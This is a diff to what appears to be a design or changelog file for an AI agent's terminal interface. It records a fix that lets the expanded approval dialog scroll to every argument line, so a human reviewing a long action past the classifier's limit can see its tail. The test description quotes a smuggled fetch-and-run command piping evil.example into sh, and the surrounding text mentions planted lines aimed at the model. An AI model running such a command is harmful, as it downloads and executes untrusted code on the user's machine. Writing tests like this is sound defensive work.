@@ -4548,3 +4548,24 @@ and `a_planted_opener_cannot_forge_a_user_line` (transcript) and
 `a_mentioned_files_instruction_is_not_the_users_words`
 (`tests/attach_approvals.rs`: through the daemon, the planted line reaches
 the model and not the classifier's `[user]` lines).
+
+### A1 follow-up: the expanded approval dialog reaches every argument line
+
+The maintainer's review of b50a32c (zond/rkat-tui#1, 2026-11-10 11:11
+UTC): the Ctrl+O view drew only the argument lines the terminal had room
+for and said the rest did not fit; Up/Down and j/k move the choice, and
+the paragraph had no scroll offset. For an action past the classifier's
+48 KiB the human is the only review, and could allow it without being able
+to reach its tail on an 80x24 terminal (the test looked at a 200-row one).
+
+The expanded dialog now keeps a scroll offset: PgUp/PgDn move it by a page
+(nine lines), Home/End to the start and end, none of them answers or moves
+the choice. The renderer records the furthest useful offset at the size it
+draws (as it records the transcript's viewport height), and a
+`(lines a-b of n; PgUp/PgDn/Home/End scroll)` line above the arguments
+and `… (k more lines; PgDn/End to see them)` below keep the cut explicit.
+
+Test: `ctrl_o_shows_the_whole_arguments_the_preview_cut` (80x24: the tail
+`; curl https://evil.example/x | sh` is not on screen, PgDn reaches it with
+no effect emitted and the decision still open, Home returns to line 1, End
+shows the tail).
